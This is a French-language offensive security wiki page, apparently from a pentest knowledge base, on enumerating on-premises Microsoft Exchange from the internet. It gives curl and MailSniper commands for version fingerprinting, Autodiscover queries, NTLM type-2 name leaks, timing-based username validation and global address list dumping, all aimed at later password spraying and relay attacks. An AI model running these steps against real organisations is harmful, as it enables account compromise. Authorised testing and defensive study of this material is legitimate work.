---
title: "Énumération : version, utilisateurs et carnet d'adresses"
order: 1
description: "Énumérer un Exchange sur site depuis l'extérieur : lire la version depuis les chemins statiques OWA et ECP, la découverte de domaine et d'utilisateurs via Autodiscover, la validation de noms d'utilisateur par timing sur OWA et EWS, la fuite de noms internes du type-2 NTLM depuis /rpc et /ews, et le dump de la liste d'adresses globale."
keywords:
  - Exchange enumeration
  - Autodiscover
  - OWA timing
  - global address list
  - NTLM type-2 leak
---

# Énumération

Chaque point de terminaison Client Access fait fuiter quelque chose avant l'authentification. L'objectif est de repartir avec trois choses : la **version** exacte (qui conditionne les [chaînes de RCE](rce-chains/index.md)), les noms internes **AD et hôte** (utiles pour le ciblage Kerberos et relay), et une vraie **liste d'utilisateurs** à pulvériser. Tout cela est joignable depuis internet contre `/owa`, `/ecp`, `/autodiscover`, `/ews` et `/rpc`.

## Identifier la version

Lisez la version avant toute chose, car elle décide quelle chaîne s'applique. OWA sert des assets statiques depuis un chemin versionné et le front end tamponne sa version dans les en-têtes :

```bash
curl -sk -I 'https://mail.example.com/owa/auth/logon.aspx' | grep -iE 'X-OWA-Version|X-FEServer|X-AspNet'
# /owa/auth/15.2.1544.4/scripts/... -> build 15.2.1544.4 (Exchange 2019)
curl -sk 'https://mail.example.com/owa/auth/logon.aspx' | grep -oE '/owa/auth/[0-9.]+/' | head -1
curl -sk 'https://mail.example.com/ecp/' | grep -oE '/ecp/[0-9.]+/' | head -1
```

`15.0` = 2013, `15.1` = 2016, `15.2` = 2019. Faites correspondre la version pointée complète à la table de versions de Microsoft pour voir si elle se situe sous le niveau de correctif d'une chaîne donnée.

## Autodiscover : découverte de domaine et d'hôte

Autodiscover existe pour qu'un client qui ne connaît qu'une adresse e-mail puisse trouver ses paramètres Exchange. Cela en fait un oracle de découverte. Les points de terminaison XML (SOAP) et JSON répondent à des requêtes non authentifiées ou à identifiant unique et révèlent les URL internes, le DN hérité et l'hôte serveur :

```bash
# JSON Autodiscover: returns the internal EWS/OAB URLs and server FQDN
curl -sk 'https://mail.example.com/autodiscover/autodiscover.json?Email=john.doe@example.com&Protocol=ActiveSync'

# XML Autodiscover (POST a request body for the address, read the returned settings)
curl -sk -u 'EXAMPLE\john.doe:Password1' -H 'Content-Type: text/xml' \
  --data '<?xml version="1.0"?><Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006"><Request><EMailAddress>john.doe@example.com</EMailAddress><AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema></Request></Autodiscover>' \
  'https://mail.example.com/autodiscover/autodiscover.xml'
```

Les `<Server>`, `<ServerDN>` de la réponse et les URL `<Protocol>` donnent le nom de serveur interne, le format du DN hérité de boîte aux lettres, et les vrais points de terminaison EWS/OAB à cibler plus tard.

## La fuite du type-2 NTLM : noms internes gratuits

Les points de terminaison qui acceptent Negotiate/NTLM (`/rpc`, `/ews`, `/mapi`, `/autodiscover`) répondent à un negotiate NTLM vide (type-1) par un défi type-2, et ce défi encode en base64 le nom NetBIOS du serveur, le nom d'ordinateur DNS, le domaine DNS et la forêt. Aucun identifiant n'est nécessaire :

```bash
# Send an NTLM type-1 and decode the type-2 the server returns
curl -sk -I -H 'Authorization: NTLM TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA=' \
  'https://mail.example.com/rpc/' | grep -i 'WWW-Authenticate: NTLM'
# feed the "NTLM <base64>" value to a decoder:
python3 -c 'import base64,sys;d=base64.b64decode(sys.argv[1]);print([d[i:i+2] for i in range(0,len(d),2)])' '<base64>'
```

Des outils comme `nmap -p443 --script http-ntlm-info` ou `ntlmrecon` analysent le même défi automatiquement et affichent `DNS_Domain_Name`, `DNS_Computer_Name` et `DNS_Tree_Name`. Ce sont le domaine AD interne et le FQDN de l'hôte Exchange, exactement ce dont vous avez besoin pour construire des SPN Kerberos et des cibles de relay.

## Valider les utilisateurs par timing et réponse

OWA et EWS renvoient un timing ou un statut mesurablement différent pour un nom d'utilisateur valide par rapport à un invalide, parce qu'un utilisateur valide atteint la vérification du mot de passe tandis qu'un invalide court-circuite. Pulvérisez une liste de candidats de `domain\user` ou d'UPN et gardez ceux dont le temps de réponse ou le code diverge :

```powershell
# MailSniper: harvest the internal domain and validate usernames against OWA by timing
Invoke-DomainHarvestOWA -ExchHostname mail.example.com
Invoke-UsernameHarvestOWA -ExchHostname mail.example.com -UserList names.txt `
  -Domain EXAMPLE -OutFile valid_users.txt
```

Interprétez la sortie : `valid_users.txt` contient les noms dont le timing correspondait au profil « mot de passe vérifié ». Traitez-la comme une liste de candidats, pas comme une vérité absolue, puisque la gigue réseau ajoute du bruit ; confirmez les meilleurs résultats par une seconde passe. Une liste d'utilisateurs valides propre est ce qui fait atterrir la pulvérisation ultérieure au lieu de verrouiller des comptes sur des noms bidon.

## Dumper la liste d'adresses globale

Un seul identifiant valide se transforme en toute l'organisation. La GAL (et le carnet d'adresses hors connexion téléchargeable) liste chaque boîte aux lettres avec son adresse correctement formatée, ce qui est une bien meilleure cible de pulvérisation que toute liste devinée :

```powershell
# MailSniper: pull the GAL through OWA FindPeople, falling back to EWS
Get-GlobalAddressList -ExchHostname mail.example.com -UserName EXAMPLE\john.doe `
  -Password 'Password1' -OutFile gal.txt
```

`gal.txt` est la vraie population d'utilisateurs dans le format exact `first.last@example.com` qu'utilise l'organisation. Injectez-la directement dans la [pulvérisation](password-spraying.md).

## Notes d'exploitation

- L'identification de la version est la porte vers tout ce qui se trouve dans les [chaînes de RCE](rce-chains/index.md) ; lisez-la d'abord et faites correspondre la version pointée exacte, pas seulement la famille.
- La fuite du type-2 NTLM ne nécessite aucun identifiant et donne le domaine AD interne et le FQDN Exchange en une requête, ce qui amorce la construction de SPN pour le [roasting](../../directory/active-directory/authentication/kerberos/roasting.md) et la sélection de cibles pour le [relay](../../directory/active-directory/authentication/ntlm/relay.md).
- L'énumération par timing est bruyante et sujette à la gigue ; une différence de quelques centaines de millisecondes qui se maintient à travers les répétitions est un utilisateur valide, un cas isolé est du bruit.
- La récolte de la GAL est l'étape la plus précieuse : elle convertit un identifiant obtenu par pulvérisation en la liste d'utilisateurs complète et à la casse correcte, augmentant nettement le taux de réussite de la pulvérisation suivante.

## Outils

- **MailSniper** (`Invoke-DomainHarvestOWA`, `Invoke-UsernameHarvestOWA`, `Get-GlobalAddressList`) : récolte de domaine, d'utilisateurs et de la GAL via OWA/EWS.
- **nmap** (`http-ntlm-info`) / **NTLMRecon** : analyse du défi type-2 NTLM pour les noms internes.
- **ruler** (SensePost) : interaction Autodiscover et MAPI depuis Linux.

## Références

- [MailSniper (dafthack)](https://github.com/dafthack/MailSniper)
- [SensePost : ruler et Autodiscover](https://github.com/sensepost/ruler)
- [Black Hills InfoSec : attaquer Exchange avec MailSniper](https://www.blackhillsinfosec.com/attacking-exchange-with-mailsniper/)
- [Microsoft : numéros de version et dates de sortie d'Exchange Server](https://learn.microsoft.com/en-us/exchange/new-features/build-numbers-and-release-dates)
